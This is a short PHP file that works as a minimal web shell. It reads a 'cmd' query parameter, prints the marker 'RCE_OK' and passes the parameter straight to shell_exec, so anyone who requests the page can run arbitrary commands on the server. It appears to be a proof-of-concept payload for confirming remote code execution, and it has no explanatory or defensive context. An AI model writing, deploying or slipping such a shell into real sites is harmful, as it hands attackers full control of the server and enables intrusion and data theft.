<?php

header('Content-Type: text/plain; charset=utf-8');

$cmd = $_GET['cmd'] ?? 'id';

echo "RCE_OK\n";
echo shell_exec($cmd);
